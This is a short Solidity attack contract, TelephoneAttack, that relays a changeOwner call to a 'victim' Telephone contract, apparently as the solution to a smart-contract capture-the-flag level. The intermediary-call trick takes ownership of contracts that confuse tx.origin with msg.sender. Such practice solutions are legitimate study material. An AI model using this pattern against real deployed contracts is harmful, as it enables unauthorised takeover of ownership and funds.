pragma solidity ^0.4.18;

import "./Telephone.sol";

contract TelephoneAttack {
    Telephone public victimContract;

    function setVictim(address _addr) public {
        victimContract = Telephone(_addr);
    }

    function changeOwner(address _owner) public {
        victimContract.changeOwner(_owner);
    }
}